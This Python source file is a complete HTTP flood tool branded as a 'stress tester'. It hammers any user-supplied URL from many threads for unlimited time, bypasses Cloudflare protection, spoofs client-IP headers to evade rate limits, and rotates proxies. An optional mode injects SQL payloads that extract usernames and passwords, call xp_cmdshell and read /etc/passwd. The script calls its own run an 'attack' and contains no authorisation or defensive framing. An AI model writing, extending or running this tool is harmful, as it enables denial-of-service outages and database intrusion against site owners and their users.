import cloudscraper
import requests
import threading
import time
import random
import string
import socket
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse

class UltraStressTester:
    def __init__(self):
        self.results = []
        self.success_count = 0
        self.error_count = 0
        self.total_requests = 0
        self.lock = threading.Lock()
        self.stop_event = threading.Event()
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Linux; Android 14; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.210 Mobile Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (iPad; CPU OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Linux; Android 14; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.210 Mobile Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0',
            'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0',
            'Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.210 Mobile Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
            'Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko',
            'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/120.0.6099.119 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0',
            'Mozilla/5.0 (X11; CrOS x86_64 15359.58.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.210 Safari/537.36'
        ]
        self.referers = [
            'https://www.google.com/',
            'https://www.facebook.com/',
            'https://twitter.com/',
            'https://www.reddit.com/',
            'https://www.youtube.com/',
            'https://www.bing.com/',
            'https://www.yahoo.com/',
            'https://www.amazon.com/',
            'https://www.linkedin.com/',
            'https://www.instagram.com/'
        ]
        self.accept_languages = [
            'en-US,en;q=0.9',
            'fr-FR,fr;q=0.9',
            'de-DE,de;q=0.9',
            'es-ES,es;q=0.9',
            'it-IT,it;q=0.9',
            'pt-BR,pt;q=0.9',
            'ru-RU,ru;q=0.9',
            'ja-JP,ja;q=0.9',
            'zh-CN,zh;q=0.9',
            'ar-SA,ar;q=0.9'
        ]
        self.proxy_list = self.load_proxies()
        self.cf_clearance = None
        self.session = requests.Session()
        
    def load_proxies(self):
        """Load proxies from file if available"""
        try:
            with open('proxies.txt', 'r') as f:
                return [line.strip() for line in f if line.strip()]
        except:
            return []
    
    def get_cf_clearance(self, url):
        """Get Cloudflare clearance cookie"""
        try:
            scraper = cloudscraper.create_scraper()
            resp = scraper.get(url)
            for cookie in scraper.cookies:
                if cookie.name == 'cf_clearance':
                    self.cf_clearance = cookie.value
                    break
        except Exception as e:
            print(f"[-] Failed to get CF clearance: {str(e)}")
    
    def generate_sql_injection(self):
        """Generate random SQL injection payloads"""
        payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT null,username,password FROM users--",
            "' AND 1=CONVERT(int, (SELECT table_name FROM information_schema.tables))--",
            "' EXEC xp_cmdshell('ping 127.0.0.1')--",
            "' OR SLEEP(5)--",
            "' OR BENCHMARK(10000000,MD5(NOW()))--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))--",
            "' OR (SELECT LOAD_FILE('/etc/passwd'))--",
            "' OR (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT(SELECT CONCAT(CAST(CURRENT_USER() AS CHAR),0x3a,0x3a,0x3a) FROM information_schema.tables LIMIT 0,1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
        ]
        return random.choice(payloads)
    
    def generate_random_data(self, size_kb=100):
        """Generate random data for POST requests"""
        return ''.join(random.choices(string.ascii_letters + string.digits + string.punctuation, k=size_kb * 1024))
    
    def get_random_proxy(self):
        """Get random proxy if available"""
        if self.proxy_list:
            return {'http': random.choice(self.proxy_list), 'https': random.choice(self.proxy_list)}
        return None
    
    def send_request(self, target_url, method, use_cloudscraper, bypass_ratelimit, sql_inject):
        """Send HTTP request with various bypass techniques"""
        headers = {
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': random.choice(self.accept_languages),
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Referer': random.choice(self.referers),
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'TE': 'trailers'
        }
        
        if bypass_ratelimit:
            headers.update({
                'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                'X-Real-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                'CF-Connecting-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                'Client-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            })
        
        if self.cf_clearance and use_cloudscraper:
            headers['Cookie'] = f'cf_clearance={self.cf_clearance}'
        
        url = target_url
        if sql_inject and method == 'GET':
            if '?' in url:
                url += '&' + self.generate_sql_injection()
            else:
                url += '?' + self.generate_sql_injection()
        
        proxy = self.get_random_proxy()
        start_time = time.time()
        status = "0"
        response_time = 0
        
        try:
            if use_cloudscraper:
                scraper = cloudscraper.create_scraper()
                if method == 'GET':
                    response = scraper.get(url, headers=headers, timeout=10, proxies=proxy)
                else:
                    response = scraper.post(url, headers=headers, data=self.generate_random_data(200), timeout=10, proxies=proxy)
            else:
                if method == 'GET':
                    response = self.session.get(url, headers=headers, timeout=10, proxies=proxy)
                else:
                    response = self.session.post(url, headers=headers, data=self.generate_random_data(200), timeout=10, proxies=proxy)
            
            status = str(response.status_code)
            response_time = time.time() - start_time
            
            with self.lock:
                self.success_count += 1
        
        except Exception as e:
            status = str(e)
            response_time = time.time() - start_time
            
            with self.lock:
                self.error_count += 1
        
        with self.lock:
            self.results.append({
                'status': status,
                'response_time': response_time,
                'method': method
            })
            self.total_requests += 1
    
    def run_attack(self, target_url, workers, duration, use_cloudscraper, bypass_ratelimit, http_method, sql_inject):
        """Run the stress test with multiple workers"""
        print(f"\n[+] ULTRA STRESS TESTER - PROFESSIONAL EDITION")
        print(f"[+] Target: {target_url}")
        print(f"[+] Workers: {workers}")
        print(f"[+] Duration: {'UNLIMITED' if duration == 0 else f'{duration} seconds'}")
        print(f"[+] Cloudflare bypass: {'ENABLED' if use_cloudscraper else 'DISABLED'}")
        print(f"[+] Rate limit bypass: {'ENABLED' if bypass_ratelimit else 'DISABLED'}")
        print(f"[+] HTTP Method: {http_method if http_method != 'MIXED' else 'GET + POST mixed'}")
        print(f"[+] SQL Injection: {'ENABLED' if sql_inject else 'DISABLED'}")
        print("[+] ATTACK STARTED - PRESS CTRL+C TO STOP\n")
        
        if use_cloudscraper:
            self.get_cf_clearance(target_url)
        
        start_time = time.time()
        
        with ThreadPoolExecutor(max_workers=workers) as executor:
            futures = []
            try:
                while not self.stop_event.is_set() and (duration == 0 or (time.time() - start_time) < duration):
                    method = http_method
                    if http_method == 'MIXED':
                        method = random.choice(['GET', 'POST'])
                    
                    futures.append(
                        executor.submit(
                            self.send_request,
                            target_url,
                            method,
                            use_cloudscraper,
                            bypass_ratelimit,
                            sql_inject
                        )
                    )
                    
                    # Clean up completed futures to save memory
                    if len(futures) >= workers * 2:
                        for future in futures:
                            if future.done():
                                futures.remove(future)
            except KeyboardInterrupt:
                self.stop_event.set()
                print("\n[!] Stopping attack... Waiting for pending requests to complete")
            
            # Wait for all pending futures to complete
            for future in as_completed(futures):
                pass
    
    def print_stats(self):
        """Print statistics about the attack"""
        total_time = max((r['response_time'] for r in self.results), default=0)
        response_times = [r['response_time'] for r in self.results]
        avg_response_time = sum(response_times) / len(response_times) if response_times else 0
        req_per_sec = self.total_requests / total_time if total_time > 0 else 0
        
        print("\n[+] ATTACK SUMMARY:")
        print(f"    Total requests: {self.total_requests}")
        print(f"    Successful: {self.success_count}")
        print(f"    Failed: {self.error_count}")
        print(f"    Total time: {total_time:.2f} seconds")
        print(f"    Average response time: {avg_response_time:.4f} seconds")
        print(f"    Requests per second: {req_per_sec:.2f}")
        
        if any(r['method'] != self.results[0]['method'] for r in self.results):
            get_count = sum(1 for r in self.results if r['method'] == 'GET')
            post_count = sum(1 for r in self.results if r['method'] == 'POST')
            print(f"    GET requests: {get_count}")
            print(f"    POST requests: {post_count}")

def get_input(prompt, default=None, input_type=str):
    """Helper function to get user input with default value"""
    while True:
        try:
            user_input = input(f"{prompt} [{default}]: " if default else f"{prompt}: ")
            if not user_input and default is not None:
                return default
            return input_type(user_input)
        except ValueError:
            print("Invalid input. Please try again.")

def main():
    print("""
    ██╗   ██╗██╗  ████████╗██████╗  █████╗     ███████╗████████╗██████╗ ███████╗███████╗███████╗██████╗ 
    ██║   ██║██║  ╚══██╔══╝██╔══██╗██╔══██╗    ██╔════╝╚══██╔══╝██╔══██╗██╔════╝██╔════╝██╔════╝██╔══██╗
    ██║   ██║██║     ██║   ██████╔╝███████║    ███████╗   ██║   ██████╔╝█████╗  █████╗  █████╗  ██████╔╝
    ██║   ██║██║     ██║   ██╔══██╗██╔══██║    ╚════██║   ██║   ██╔══██╗██╔══╝  ██╔══╝  ██╔══╝  ██╔══██╗
    ╚██████╔╝███████╗██║   ██║  ██║██║  ██║    ███████║   ██║   ██║  ██║███████╗██║     ███████╗██║  ██║
     ╚═════╝ ╚══════╝╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝    ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝     ╚══════╝╚═╝  ╚═╝
                                                                               Professional Edition v2.0
    """)
    
    target_url = get_input("Enter target URL")
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'http://' + target_url
    
    duration = get_input("Attack duration in seconds (0 for unlimited)", 0, int)
    workers = get_input("Number of workers (recommended 50-200)", 100, int)
    use_cloudscraper = get_input("Bypass Cloudflare? (y/n)", 'y', str).lower() == 'y'
    bypass_ratelimit = get_input("Bypass rate limits? (y/n)", 'y', str).lower() == 'y'
    http_method = get_input("HTTP method (GET/POST/MIXED)", 'MIXED', str).upper()
    sql_inject = get_input("Enable SQL injection? (y/n)", 'n', str).lower() == 'y'
    
    tester = UltraStressTester()
    
    try:
        tester.run_attack(
            target_url,
            workers,
            duration,
            use_cloudscraper,
            bypass_ratelimit,
            http_method,
            sql_inject
        )
    except KeyboardInterrupt:
        print("\n[!] Attack stopped by user")
    finally:
        tester.stop_event.set()
        tester.print_stats()

if __name__ == "__main__":
    main()
